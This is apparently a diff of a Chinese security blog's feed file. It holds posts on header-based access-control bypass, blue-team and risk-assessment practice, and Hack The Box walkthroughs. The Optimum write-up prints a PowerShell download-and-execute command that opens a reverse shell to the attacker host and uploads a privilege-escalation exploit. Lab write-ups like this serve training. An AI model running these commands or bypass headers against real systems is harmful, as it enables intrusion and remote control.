-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般代理头姿势如下：</span><br><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>示例：</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">  X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x03-个人小结："><a href="#0x03-个人小结：" class="headerlink" title="0x03 个人小结："></a><strong><em>0x03 个人小结：</em></strong></h2><p><strong><em>就针对绕过而言，不管是改变请求方式还是请求内容，目的其实都是让请求看起来是合理的。（不是屁话么？）</em></strong></p>
-]]></content>
-      <categories>
-        <category>安全技巧</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>蓝队项目经理一般套路</title>
-    <url>/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>   <strong><em>近期参与了几个攻防演练，想趁热打铁记点东西~</em></strong></p>
-<h2 id="0x01-基本了解"><a href="#0x01-基本了解" class="headerlink" title="0x01 基本了解"></a><strong><em>0x01 基本了解</em></strong></h2><p><strong><em>蓝队以参演单位现有防护运营体系为基础， 应对实战攻防组建一支防守队伍。主要负责前期安全、 检查、整改与加固，演练期间网络安全监测、预警、 分析、验证、处置，后期复盘总结现有防护工作中不 足之处，为后期常态化防护工作提供优化依据。</em></strong></p>
-<h2 id="0x02-常规角色与分工情况"><a href="#0x02-常规角色与分工情况" class="headerlink" title="0x02  常规角色与分工情况"></a><strong><em>0x02  常规角色与分工情况</em></strong></h2><p><strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
-<h2 id="0x03-一般实施思路"><a href="#0x03-一般实施思路" class="headerlink" title="0x03 一般实施思路"></a><strong><em>0x03 一般实施思路</em></strong></h2><p> <strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
-<h2 id="0x04-一些体会"><a href="#0x04-一些体会" class="headerlink" title="0x04 一些体会"></a><strong><em>0x04 一些体会</em></strong></h2><p><strong><em>上面讲了一些介绍，提了点思路，下面讲下体会~</em></strong></p>
-<p><strong><em>1、对外暴露资产及弱口令的梳理非常关键。</em></strong></p>
-<p><strong><em>2、监测设备能不能”打”很关键。</em></strong></p>
-<p><strong><em>3、多做能向客户体现价值的活（汇报、提建议），脏活累活给友商~~</em></strong></p>
+    <title>风险评估的一般套路~</title>
+    <url>/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>​     <strong><em>风险评估是组织用于确定信息安全需求的重要方法，建设信息安全管理体系的必要途径，是作为信息安全管理者的必备能力， 希望对大家了解或实施有所帮助~</em></strong></p>
+<h2 id="0x01-风险评估是啥？"><a href="#0x01-风险评估是啥？" class="headerlink" title="0x01 风险评估是啥？"></a><strong><em>0x01 风险评估是啥？</em></strong></h2><p>​     <strong><em>信息安全风险评估是指依据有关信息安全技术与管理标准，对信息资产识别、威胁识别、脆弱性识别、风险值的计算，评估资产面临的威胁以及威胁利用脆弱性导致安全事件的可能性，并结合安全事件所涉及的资产价值来判断安全事件一旦发生对组织造成的影响。</em></strong></p>
+<h2 id="0x02-基本术语了解"><a href="#0x02-基本术语了解" class="headerlink" title="0x02 基本术语了解"></a><strong><em>0x02 基本术语了解</em></strong></h2><p>​      <strong><em>风评的术语不少，像ARO(年发生率)、SLE（单一损失期望）、EF（暴露因子）之类比较玄的概念， 本次不展开讲。就只讲以下几个本人觉得比较核心的~</em></strong></p>
+<p><strong><em>1、资产价值：顾名思义，可以用金额或发生事件会造成的影响来衡量价值。</em></strong></p>
+<p><strong><em>2、威胁：特定场景中，可能导致的事件。</em></strong></p>
+<p><strong><em>3、脆弱性：漏洞或弱点，即资产或资产组中存在的可被威胁利用的弱点，弱点一旦被利用可能会对资产造成损害。</em></strong></p>
+<p><strong><em>4、风险：特定威胁利用资产弱点给资产或资产组带来损害的可能性。(一般风险计算公式 : 资产价值 x 威胁 x 脆弱性  = 风险)</em></strong></p>
+<p>​    <strong><em>威胁、脆弱性、风险三者的关系如下图所示：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></em></strong></p>
+<h2 id="0x03-风险分析方法"><a href="#0x03-风险分析方法" class="headerlink" title="0x03  风险分析方法"></a><strong><em>0x03  风险分析方法</em></strong></h2><p>​     <strong><em>风险分析具有定量和定性两种方法：</em></strong></p>
+<p><strong><em>1、定性分析，更多以观点和场景为基础，使用评级的方式来评定风险的关键级别。</em></strong></p>
+<p><strong><em>2、定量分析，会尝试为风险分析过程所有元素都赋值，每个元素（资产价值、威胁评率、脆弱性的严重程度、损失影响、防护成本、防护有效性等）都被量化输入公式，然后计算出总风险和剩余风险。</em></strong> </p>
+<p>​      <strong><em>两者特征如下图：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></em></strong></p>
+<p>​     <strong><em>简单来说定性比较主观，根据实施人员的经验，判断出风险的高中低（类似于国内的等保测评），但优点在于较容易实施开展；相对的定量分析则由于需要一定的风评辅助工具，且正统的定量分析以发生事件产生的金额损失为结果表现，实施须涉及资产估值（据个人BCS安全大会了解，国内暂无资产估值的标准，正在做），实施难度较大。总的来说两种方法各有优缺点，分别适用于特定的场合。</em></strong></p>
+<h2 id="0x04-一般实施思路"><a href="#0x04-一般实施思路" class="headerlink" title="0x04 一般实施思路"></a><strong><em>0x04 一般实施思路</em></strong></h2><p>​    <strong><em>结合个人实际工作经验，大致实施思路分为以下几点：</em></strong></p>
+<p><strong><em>1、根据需求选取合适的标准，整理出合适CheckList</em></strong><br><strong><em>2、根据项目大小，选择合适的评估范围</em></strong><br><strong><em>3、收集脆弱点，结合威胁识别/计算出各项风险</em></strong><br><strong><em>4、汇总问题，构思报告表现</em></strong></p>
+<h2 id="0x05-一般报告结构"><a href="#0x05-一般报告结构" class="headerlink" title="0x05 一般报告结构"></a><strong><em>0x05 一般报告结构</em></strong></h2><p>​    <strong><em>报告结构这块弹性较大，需结合实际项目，但一般结构包含下图所示几点：</em></strong><br><strong><em><img src="/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/3.png" class></em></strong></p>
 ]]></content>
       <categories>
         <category>技战法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>HTB - Emdee five for life</title>
-    <url>/2021/01/24/HTB-Emdee-five-for-life/</url>
-    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到的一题。求解涉及简单爬虫，正好趁此重拾下python~</em></strong></p>
-<h2 id="0x01摸索过程："><a href="#0x01摸索过程：" class="headerlink" title="0x01摸索过程："></a><strong><em>0x01摸索过程：</em></strong></h2><p><strong><em>启动实例前稍稍瞄下，什么？Can you encrypt fast enough? 嗯。。。。</em></strong></p>
-<img src="/2021/01/24/HTB-Emdee-five-for-life/1.png" class>
-
-<p><strong><em>启动实例，打开链接出现网页，意思上看来是要把显示的字段MD5加密后post，但经手工测试，不管手速多快，都是显示 too  slow！？ 嗯。。。</em></strong></p>
-<img src="/2021/01/24/HTB-Emdee-five-for-life/2.png" class>
-
-<h2 id="0x02求解过程："><a href="#0x02求解过程：" class="headerlink" title="0x02求解过程："></a><strong><em>0x02求解过程：</em></strong></h2><p><strong><em>目前看来是要写个爬虫，爬取需加密的字段，经MD5加密后post回去呢。大体思路有了，先看下网页源码，看下post参数是啥</em></strong></p>
-<img src="/2021/01/24/HTB-Emdee-five-for-life/3.png" class>
-
-<p><strong><em>想想整个流程需要的python模块可以为：request、hashlib和BeautifulSoup，直击开干吧！</em></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># __author__=&#x27;lwof&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://68.183.34.159:30019&#x27;</span></span><br><span class="line">sessions = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geter</span>():</span></span><br><span class="line">	r = sessions.get(url = url)</span><br><span class="line">	soup = BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">	<span class="keyword">global</span> get</span><br><span class="line">	get = soup.h3.string</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dater</span>():</span></span><br><span class="line">	geter()</span><br><span class="line">	<span class="built_in">hash</span> = hashlib.md5(get.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">	<span class="keyword">global</span> data</span><br><span class="line">	data = &#123;<span class="string">&#x27;hash&#x27;</span>: <span class="built_in">hash</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poster</span>():</span></span><br><span class="line">	dater()</span><br><span class="line">	a = sessions.post(url = url,data = data )</span><br><span class="line">	print(a.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	poster()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()	</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>嘿嘿，直接获取到key~</em></strong></p>
-<img src="/2021/01/24/HTB-Emdee-five-for-life/4.png" class>
-
-<h2 id="0x03个人小结："><a href="#0x03个人小结：" class="headerlink" title="0x03个人小结："></a><strong><em>0x03个人小结：</em></strong></h2><p><strong><em>这题求解思路其实很简单，其中有个坑点是要用requests.session()去保持会话，新建会话又会返回too slow和新的需加密字段。但个人通过这题重拾了不少python的知识，还是要谢谢把这题发给我的那位朋友哈~</em></strong></p>
-]]></content>
-      <categories>
-        <category>安全实验</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>HTB-Optimum</title>
-    <url>/2021/01/24/HTB-Optimum/</url>
-    <content><![CDATA[<h2 id="0x00前言："><a href="#0x00前言：" class="headerlink" title="0x00前言："></a><strong><em>0x00前言：</em></strong></h2><p><strong><em>近期，在玩Hack The Box，遇到一个叫Optimum的靶机，第一次玩相关靶机全程不用msf，所以要记下来(<em>^▽^</em>)</em></strong></p>
-<h2 id="0x01探索阶段："><a href="#0x01探索阶段：" class="headerlink" title="0x01探索阶段："></a><strong><em>0x01探索阶段：</em></strong></h2><p><strong><em>靶机套路，废话不多说。先用祖传的nmap扫下</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -F -O -sV --version-light 10.10.10.8 </span><br></pre></td></tr></table></figure>
-
-<p><strong><em>扫出结果如下，发现存在80端口，且为2.3版本HFS。</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-22 21:50 EST</span><br><span class="line">Nmap scan report for 10.10.10.8</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 99 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    HttpFileServer httpd 2.3</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.76 seconds</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>再searchsploit下</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/1.png" class>
-
-<p><strong><em>查看下详情：</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -t hfs -x windows&#x2F;remote&#x2F;39161.py</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/2.png" class>
-
-<p><strong><em>貌似是该py命令执行是基于nc.exe的，不方便的样子，找下其他exp。花了点功夫，找到一个用powershell的</em></strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;49125</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/3.png" class>
-
-
-
-<h2 id="0x02突破阶段："><a href="#0x02突破阶段：" class="headerlink" title="0x02突破阶段："></a><strong><em>0x02突破阶段：</em></strong></h2><p><strong><em>因为该exp远程命令执行、靶机为windows、且网络只与kali相通。所以我的getshell思路是，远程命令利用powershell去下载kali里的powercat，然后反连nc。</em></strong></p>
-<p><strong><em>直接开干！！</em></strong></p>
-<p><strong><em>1、拉个powercat到kali先（<a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1%EF%BC%89">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1）</a></em></strong></p>
-<p><strong><em>2、kali开web服务：sudo python -m SimpleHTTPServer 80</em></strong></p>
-<p><strong><em>3、kali  开个nc： nc -lvvp 4444</em></strong></p>
-<p><strong><em>4、构造下远程执行利用语句：</em></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 <span class="number">10.10</span><span class="number">.10</span><span class="number">.8</span> <span class="number">80</span> <span class="string">&quot;c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.33/powercat.ps1&#x27;); powercat -c 10.10.14.33 -p 6666 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/4.png" class>
-
-<p><strong><em>成功getshell！！！！</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/5.png" class>
-
-<p><strong><em>但貌似还只是低权限呢，只能抓个user.txt。。。。</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/6.png" class>
-
-
-
-<h2 id="0x03提权阶段："><a href="#0x03提权阶段：" class="headerlink" title="0x03提权阶段："></a><strong><em>0x03提权阶段：</em></strong></h2><p><strong><em>拿shell后，systeminfo一波后给Windows-Exploit-Suggester分析下</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/7.png" class>
-
-<img src="/2021/01/24/HTB-Optimum/8.png" class>
-
-<p><strong><em>踩了点坑后，将矛头直接对准ms16-098</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/9.png" class>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;41020</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/10.png" class>
-
-<img src="/2021/01/24/HTB-Optimum/11.png" class>
-
-<p><strong><em>下载到kali后，然后在shell上使用powershell传到靶机上去！</em></strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;Invoke-WebRequest -Uri http://10.10.14.33/bfill.exe -OutFile C:\Users\kostas\Desktop\bfill.exe</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/01/24/HTB-Optimum/12.png" class>
-
-<p><strong><em>运行后直接变为system权限！</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/13.png" class>
-
-<p><strong><em>有权限后后切换administrator目录找到root.txt</em></strong></p>
-<img src="/2021/01/24/HTB-Optimum/14.png" class>
-
-
-
-<h2 id="0x04个人小结："><a href="#0x04个人小结：" class="headerlink" title="0x04个人小结："></a><strong><em>0x04个人小结：</em></strong></h2><p>该靶机的攻略过程看似中规中矩的，但在突破阶段在不使用msf的情况下找合适exp，及提权阶段的漏洞筛选、工具查找、及基于powershell的上传操作其实是坑点，个人在实操过程深有体会~~</p>
-]]></content>
-      <categories>
-        <category>安全实验</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>HTB-Shocker</title>
-    <url>/2021/02/03/HTB-Shocker/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天空闲时间又在玩HTB，一个叫Shocker的退役靶机。还是太菜，打不过。在观看IPPSEC大神的视频后，才拓然开朗！！！大神就是叼叼的，在这边安利一波 ：<a href="https://youtu.be/IBlTdguhgfY">https://youtu.be/IBlTdguhgfY</a></p>
-<h2 id="0x01-探索过程"><a href="#0x01-探索过程" class="headerlink" title="0x01 探索过程"></a>0x01 探索过程</h2><h3 id="端口探索"><a href="#端口探索" class="headerlink" title="端口探索"></a>端口探索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -A -v  -sS 10.10.10.56</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br></pre></td></tr></table></figure>
-
-<p>嗯，发现开了80和2222端口</p>
-<h4 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit   apache 2.4                                                   130 ⨯</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                      |  Path</span><br><span class="line">---------------------------------------------------- ---------------------------------</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - cgi-bin Remote Co | php/remote/29290.c</span><br><span class="line">Apache + PHP &lt; 5.3.12 / &lt; 5.4.2 - Remote Code Execu | php/remote/29316.py</span><br><span class="line">Apache 2.2.4 - 413 Error HTTP Request Method Cross- | unix/remote/30835.sh</span><br><span class="line">Apache 2.4.17 - Denial of Service                   | windows/dos/39037.php</span><br><span class="line">Apache 2.4.17 &lt; 2.4.38 - <span class="string">&#x27;apache2ctl graceful&#x27;</span> <span class="string">&#x27;log | linux/local/46676.php</span></span><br><span class="line"><span class="string">Apache 2.4.23 mod_http2 - Denial of Service         | linux/dos/40909.py</span></span><br><span class="line"><span class="string">Apache 2.4.7 + PHP 7.0.2 - &#x27;</span>openssl_seal()<span class="string">&#x27; Uniniti | php/remote/40142.php</span></span><br><span class="line"><span class="string">Apache 2.4.7 mod_status - Scoreboard Handling Race  | linux/dos/34133.txt</span></span><br><span class="line"><span class="string">Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak    | linux/webapps/42745.py</span></span><br><span class="line"><span class="string">Apache CXF &lt; 2.5.10/2.6.7/2.7.4 - Denial of Service | multiple/dos/26710.txt</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuck.c<span class="string">&#x27; Remot | unix/remote/21671.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/47080.c</span></span><br><span class="line"><span class="string">Apache mod_ssl &lt; 2.8.7 OpenSSL - &#x27;</span>OpenFuckV2.c<span class="string">&#x27; Rem | unix/remote/764.c</span></span><br><span class="line"><span class="string">Apache OpenMeetings 1.9.x &lt; 3.1.0 - &#x27;</span>.ZIP<span class="string">&#x27; File Dir | linux/webapps/39642.txt</span></span><br><span class="line"><span class="string">Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE | multiple/remote/48410.rb</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>RealPath.jsp<span class="string">&#x27; Informat | multiple/remote/21492.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>Source.jsp<span class="string">&#x27; Informatio | multiple/remote/21490.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root  | multiple/remote/21491.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 5.5.17 - Remote Directory Listing   | multiple/remote/2061.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | multiple/remote/6229.txt</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 6.0.18 - &#x27;</span>utf8<span class="string">&#x27; Directory Traversal | unix/remote/14489.c</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | jsp/webapps/42966.py</span></span><br><span class="line"><span class="string">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47  | windows/webapps/42953.txt</span></span><br><span class="line"><span class="string">Apache Xerces-C XML Parser &lt; 3.1.2 - Denial of Serv | linux/dos/36906.txt</span></span><br><span class="line"><span class="string">Webfroot Shoutbox &lt; 2.32 (Apache) - Local File Incl | linux/remote/34.pl</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="Web探索"><a href="#Web探索" class="headerlink" title="Web探索"></a>Web探索</h3><img src="/2021/02/03/HTB-Shocker/1.png" class>
-
-<h4 id="目录扫描："><a href="#目录扫描：" class="headerlink" title="目录扫描："></a>目录扫描：</h4><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56       </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30</span><br><span class="line">Wordlist size: 10832</span><br><span class="line"></span><br><span class="line">Error Log: /home/lw0f/tools/dirsearch/logs/errors-21-02-03_20-50-01.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /home/lw0f/tools/dirsearch/reports/10.10.10.56/_21-02-03_20-50-02.txt</span><br><span class="line"></span><br><span class="line">[20:50:02] Starting: </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.bak1                             </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.orig </span><br><span class="line">[20:50:11] 403 -  300B  - /.htaccess.save</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessBAK</span><br><span class="line">[20:50:11] 403 -  299B  - /.htaccessOLD2          </span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccessOLD</span><br><span class="line">[20:50:11] 403 -  301B  - /.htaccess_extra</span><br><span class="line">[20:50:11] 403 -  290B  - /.htm</span><br><span class="line">[20:50:11] 403 -  291B  - /.html</span><br><span class="line">[20:50:11] 403 -  298B  - /.htaccess_sc</span><br><span class="line">[20:50:11] 403 -  296B  - /.htpasswds</span><br><span class="line">[20:50:11] 403 -  300B  - /.htpasswd_test</span><br><span class="line">[20:50:11] 403 -  297B  - /.httr-oauth</span><br><span class="line">[20:50:11] 403 -  297B  - /.ht_wsr.txt                         </span><br><span class="line">[20:50:11] 403 -  302B  - /.htaccess.sample                    </span><br><span class="line">[20:50:12] 403 -  300B  - /.htaccess_orig   </span><br><span class="line">[20:50:58] 403 -  294B  - /cgi-bin/                                     </span><br><span class="line">[20:51:17] 200 -  137B  - /index.html                         </span><br><span class="line">[20:51:42] 403 -  300B  - /server-status/                      </span><br><span class="line">[20:51:42] 403 -  299B  - /server-status</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>嗯发现burp也抓不了页面、换了dirbuster也扫不出内容，咋继续？貌似陷入僵局了。。。。。。。</p>
-<p>偷瞄下 ippsec的视频后，发现突破口在/cgi-bin/  ，及扫描姿势，换个gobuster试试 ~</p>
-<h5 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirb/wordlists/small.txt -t 50 -s200,204,301,302,307,401,403 -x pl,sh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.56/cgi-bin/</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       /usr/share/dirb/wordlists/small.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     pl,sh</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:23 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/user.sh (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/02/03 21:16:49 Finished</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>找到了 user.sh ,这下应该能抓包了，尝试shellshock试下！！</p>
-<h3 id="突破阶段"><a href="#突破阶段" class="headerlink" title="突破阶段"></a>突破阶段</h3><h4 id="what-a-shellshock！！"><a href="#what-a-shellshock！！" class="headerlink" title="what  a  shellshock！！"></a>what  a  shellshock！！</h4><img src="/2021/02/03/HTB-Shocker/2.png" class>
-
-<img src="/2021/02/03/HTB-Shocker/3.png" class>
-
-<img src="/2021/02/03/HTB-Shocker/4.png" class>
-
-
-
-<h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><h4 id="把哑shell换成tty先"><a href="#把哑shell换成tty先" class="headerlink" title="把哑shell换成tty先"></a>把哑shell换成tty先</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure>
-
